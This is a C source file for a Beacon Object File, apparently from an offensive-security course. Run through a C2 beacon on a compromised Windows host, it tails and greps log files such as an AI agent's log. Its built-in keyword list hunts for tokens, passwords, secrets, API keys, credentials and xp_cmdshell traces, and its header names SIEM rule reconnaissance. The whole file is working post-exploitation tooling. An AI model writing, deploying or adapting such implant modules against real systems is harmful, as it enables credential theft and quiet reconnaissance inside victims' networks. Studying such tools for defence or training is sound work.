/*
 * logTail.c — in-process AI-log grep/tail (OSAI T3).
 * Course: M11.5 agent.log (ingest_ok / lm_response / 60s heartbeat / read_file),
 *         M2.8 SIEM rule recon.  Replaces `Get-Content -Tail`/`findstr`/`Select-String`.
 *
 * args: str path, int lastN(0=all, >0=only last N matched lines), str grep(empty=builtin)
 */
#include "aibof.h"

static const char* LOG_KEYS[] = {
  "ingest_ok","lm_response","heartbeat","read_file","error","alert",
  "token","password","secret","key","credential","api_key","xp_cmdshell",
  "directive","inject","bypass","unauthorized","denied", NULL
};

static void emit_line(const char* line, int len) {
  if (len > 2000) len = 2000;
  char tmp[2008]; xmemcpy(tmp, line, len); tmp[len] = 0;
  BeaconPrintf(CALLBACK_OUTPUT, "%s\n", tmp);
}

static int line_match(const char* line, int len, const char* grep) {
  if (grep && *grep) return buf_contains_ci(line, len, grep);
  for (int i = 0; LOG_KEYS[i]; i++)
    if (buf_contains_ci(line, len, LOG_KEYS[i])) return 1;
  return 0;
}

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  char* path = BeaconDataExtract(&p, NULL);
  int lastN = BeaconDataInt(&p);
  char* grep = BeaconDataExtract(&p, NULL);
  if (!path || !*path) { BeaconPrintf(CALLBACK_ERROR, "usage: logTail <path> [lastN grep]\n"); return; }

  unsigned char* buf = NULL; DWORD got = 0;
  if (!read_file(path, &buf, &got, 4 * 1024 * 1024)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] %s unreadable\n", path); return;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[*] logTail %s (%lu bytes) lastN=%d grep=%s\n",
               path, got, lastN, grep ? grep : "-");

  /* ring buffer of matched lines for lastN mode */
  char** ring = NULL; int ringcap = lastN > 0 ? lastN : 0;
  if (ringcap > 0) ring = (char**)intAlloc(sizeof(char*) * ringcap);
  int rpos = 0, rcount = 0;

  DWORD i = 0;
  while (i < got) {
    DWORD start = i;
    while (i < got && buf[i] != '\n') i++;
    int len = i - start;
    if (i < got) i++; /* skip \n */
    if (len > 0 && buf[start + len - 1] == '\r') len--;
    if (line_match((char*)buf + start, len, grep)) {
      if (ring) {
        if (rcount < ringcap) { ring[rcount++] = (char*)(buf + start); }
        else { ring[rpos] = (char*)(buf + start); rpos = (rpos + 1) % ringcap; }
      } else {
        emit_line((char*)buf + start, len);
      }
    }
  }
  if (ring) {
    int start = (rcount < ringcap) ? 0 : rpos;
    for (int k = 0; k < rcount; k++) {
      char* line = ring[(start + k) % ringcap];
      int llen = (int)xlen(line); /* until next \n or end */
      /* find line end within buf */
      char* nl = xstrstr(line, "\n"); llen = nl ? (int)(nl - line) : llen;
      if (llen > 0 && line[llen-1] == '\r') llen--;
      emit_line(line, llen);
    }
  }
  if (ring) intFree(ring);
  intFree(buf);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] logTail done\n");
}